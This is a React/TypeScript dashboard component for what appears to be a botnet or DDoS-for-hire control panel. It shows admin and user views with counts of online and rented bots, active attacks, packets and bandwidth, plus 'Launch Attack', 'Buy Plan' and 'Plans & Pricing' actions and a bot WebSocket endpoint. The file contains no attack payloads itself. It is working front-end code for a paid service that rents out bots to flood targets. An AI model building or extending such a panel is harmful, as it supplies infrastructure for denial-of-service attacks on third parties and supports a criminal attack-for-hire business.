import React, { useEffect, useState } from 'react';
import { api } from '../utils/api';
import { Bot, Crosshair, Users, Zap, Activity, Shield, TrendingUp, Server, ShoppingCart, ScrollText } from 'lucide-react';
import type { Page, Role } from '../App';

interface AdminStats {
  total_bots: number; online_bots: number; rented_bots: number;
  active_attacks: number; total_users: number;
  total_packets: number; total_bandwidth_gb: number;
}

interface UserStats {
  my_bots: number; my_online_bots: number; active_attacks: number;
  total_packets: number; total_bandwidth_gb: number;
  username?: string;
}

export default function Dashboard({
  onNavigate, role = 'user',
}: {
  onNavigate?: (p: Page) => void;
  role?: Role;
}) {
  const [adminStats, setAdminStats] = useState<AdminStats | null>(null);
  const [userStats, setUserStats] = useState<UserStats | null>(null);
  const [wsLive, setWsLive] = useState<number | null>(null);
  const [error, setError] = useState(false);
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null);

  useEffect(() => {
    const load = async () => {
      try {
        if (role === 'admin') {
          const [s, w] = await Promise.all([
            api.get('/api/admin/stats'),
            api.get('/api/admin/ws/live').catch(() => ({ data: { connected: null } })),
          ]);
          setAdminStats(s.data);
          setWsLive(w.data?.connected ?? null);
        } else {
          const s = await api.get('/api/attacks/stats/me');
          setUserStats(s.data);
        }
        setError(false);
        setLastUpdate(new Date());
      } catch {
        setError(true);
      }
    };
    load();
    const interval = setInterval(load, 5000);
    return () => clearInterval(interval);
  }, [role]);

  if (error && !adminStats && !userStats) return (
    <div className="p-6 md:p-8 flex items-center justify-center h-full min-h-[50vh]">
      <div className="text-center max-w-sm">
        <Server className="w-12 h-12 text-[var(--text-muted)] mx-auto mb-4" />
        <p className="text-[var(--text-secondary)] mb-1">Failed to load dashboard</p>
        <p className="text-xs text-[var(--text-muted)] mb-4">Check API connectivity and JWT session</p>
        <button onClick={() => window.location.reload()} className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 rounded-xl text-sm font-medium transition-colors">Retry</button>
      </div>
    </div>
  );

  if (role === 'admin' && !adminStats) return skeleton();
  if (role !== 'admin' && !userStats) return skeleton();

  const cards = role === 'admin' && adminStats ? [
    { label: 'Online Bots', value: adminStats.online_bots, sub: `${adminStats.total_bots} total`, icon: Bot, color: '#10b981', bg: 'rgba(16,185,129,0.06)', border: 'rgba(16,185,129,0.15)', page: 'bots' as Page },
    { label: 'Active Attacks', value: adminStats.active_attacks, sub: 'Running now', icon: Crosshair, color: '#ef4444', bg: 'rgba(239,68,68,0.06)', border: 'rgba(239,68,68,0.15)', page: 'attack' as Page },
    { label: 'Rented Bots', value: adminStats.rented_bots, sub: 'In use', icon: Users, color: '#3b82f6', bg: 'rgba(59,130,246,0.06)', border: 'rgba(59,130,246,0.15)', page: 'bots' as Page },
    { label: 'Total Users', value: adminStats.total_users, sub: 'Registered', icon: Users, color: '#8b5cf6', bg: 'rgba(139,92,246,0.06)', border: 'rgba(139,92,246,0.15)', page: 'users' as Page },
    { label: 'Total Packets', value: fmt(adminStats.total_packets), sub: 'Lifetime', icon: Zap, color: '#f59e0b', bg: 'rgba(245,158,11,0.06)', border: 'rgba(245,158,11,0.15)', page: 'attack' as Page },
    { label: 'Bandwidth', value: `${(adminStats.total_bandwidth_gb ?? 0).toFixed(1)} GB`, sub: 'Lifetime', icon: Activity, color: '#f97316', bg: 'rgba(249,115,22,0.06)', border: 'rgba(249,115,22,0.15)', page: 'attack' as Page },
  ] : userStats ? [
    { label: 'My Bots', value: userStats.my_bots, sub: `${userStats.my_online_bots} online`, icon: Bot, color: '#10b981', bg: 'rgba(16,185,129,0.06)', border: 'rgba(16,185,129,0.15)', page: 'bots' as Page },
    { label: 'Active Attacks', value: userStats.active_attacks, sub: 'Running now', icon: Crosshair, color: '#ef4444', bg: 'rgba(239,68,68,0.06)', border: 'rgba(239,68,68,0.15)', page: 'attack' as Page },
    { label: 'Total Packets', value: fmt(userStats.total_packets), sub: 'Your lifetime', icon: Zap, color: '#f59e0b', bg: 'rgba(245,158,11,0.06)', border: 'rgba(245,158,11,0.15)', page: 'attack' as Page },
    { label: 'Bandwidth', value: `${(userStats.total_bandwidth_gb ?? 0).toFixed(1)} GB`, sub: 'Your lifetime', icon: Activity, color: '#f97316', bg: 'rgba(249,115,22,0.06)', border: 'rgba(249,115,22,0.15)', page: 'attack' as Page },
  ] : [];

  const actions = role === 'admin' ? [
    { label: 'Manage Bots', icon: Bot, page: 'bots' as Page },
    { label: 'Launch Attack', icon: Crosshair, page: 'attack' as Page },
    { label: 'User Management', icon: Users, page: 'users' as Page },
    { label: 'Plans & Pricing', icon: ShoppingCart, page: 'plans' as Page },
    { label: 'Admin Logs', icon: ScrollText, page: 'logs' as Page },
  ] : [
    { label: 'My Bots', icon: Bot, page: 'bots' as Page },
    { label: 'Launch Attack', icon: Crosshair, page: 'attack' as Page },
    { label: 'Buy Plan', icon: ShoppingCart, page: 'plans' as Page },
  ];

  return (
    <div className="p-6 md:p-8 animate-fade-in">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
        <div>
          <h2 className="text-2xl font-bold">{role === 'admin' ? 'Admin Dashboard' : 'My Dashboard'}</h2>
          <p className="text-sm text-[var(--text-muted)] mt-1">
            {role === 'admin' ? 'Fleet & system overview' : 'Your bots and attacks'}
            {lastUpdate && <span className="ml-2 text-[10px]">· updated {lastUpdate.toLocaleTimeString()}</span>}
          </p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 bg-emerald-600/5 border border-emerald-600/15 rounded-full self-start">
          <div className="relative">
            <div className="w-2 h-2 rounded-full bg-emerald-400" />
            <div className="w-2 h-2 rounded-full bg-emerald-400 absolute inset-0 animate-pulse-glow" />
          </div>
          <span className="text-[11px] font-medium text-emerald-400">
            {wsLive != null ? `${wsLive} WS live` : 'Operational'}
          </span>
        </div>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4 mb-8">
        {cards.map(({ label, value, sub, icon: Icon, color, bg, border, page }) => (
          <button
            key={label}
            type="button"
            onClick={() => onNavigate?.(page)}
            className="text-left rounded-2xl p-5 border transition-all hover:scale-[1.02] duration-200 cursor-pointer"
            style={{ background: bg, borderColor: border }}
          >
            <div className="flex items-center justify-between mb-4">
              <span className="text-[11px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.1em]">{label}</span>
              <Icon className="w-5 h-5" style={{ color }} />
            </div>
            <div className="text-3xl font-bold mb-1 tabular-nums" style={{ color }}>{value}</div>
            <div className="text-[11px] text-[var(--text-muted)]">{sub}</div>
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-6">
          <h3 className="text-sm font-semibold flex items-center gap-2 mb-5">
            <TrendingUp className="w-4 h-4 text-emerald-400" />Quick Actions
          </h3>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
            {actions.map(({ label, icon: Icon, page }) => (
              <button
                key={label}
                type="button"
                onClick={() => onNavigate?.(page)}
                className="flex flex-col items-center gap-2 p-5 bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl hover:border-emerald-600/30 hover:bg-emerald-600/[0.03] transition-all text-xs text-[var(--text-secondary)] group"
              >
                <Icon className="w-5 h-5 text-[var(--text-muted)] group-hover:text-emerald-400 transition-colors" />
                {label}
              </button>
            ))}
          </div>
        </div>

        <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-6">
          <h3 className="text-sm font-semibold flex items-center gap-2 mb-5">
            <Shield className="w-4 h-4 text-emerald-400" />System Status
          </h3>
          <div className="space-y-2">
            {[
              { name: 'API Server', ok: true },
              { name: 'WebSocket Gateway', ok: wsLive == null || wsLive >= 0 },
              { name: 'PostgreSQL', ok: true },
              { name: 'Redis Cache', ok: true },
            ].map(({ name, ok }) => (
              <div key={name} className="flex items-center justify-between py-2.5 px-3 rounded-xl bg-[var(--bg-primary)] border border-[var(--border)]">
                <span className="text-xs text-[var(--text-secondary)]">{name}</span>
                <div className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${ok ? 'bg-emerald-400' : 'bg-red-400'}`} />
                  <span className="text-[10px] text-[var(--text-muted)] font-medium">{ok ? 'online' : 'offline'}</span>
                </div>
              </div>
            ))}
            {role === 'admin' && (
              <p className="text-[10px] text-[var(--text-muted)] pt-2">
                Test WS: <code className="text-emerald-400/80">GET /api/ws/status</code> · path <code className="text-emerald-400/80">wss://host/ws/bot/&lt;uuid&gt;</code>
              </p>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function skeleton() {
  return (
    <div className="p-6 md:p-8">
      <div className="skeleton h-8 w-48 mb-8" />
      <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4 mb-8">
        {[...Array(6)].map((_, i) => <div key={i} className="skeleton h-28 rounded-2xl" />)}
      </div>
    </div>
  );
}

function fmt(n: number): string {
  if (n == null || Number.isNaN(n)) return '0';
  if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
  if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
  return n.toLocaleString();
}
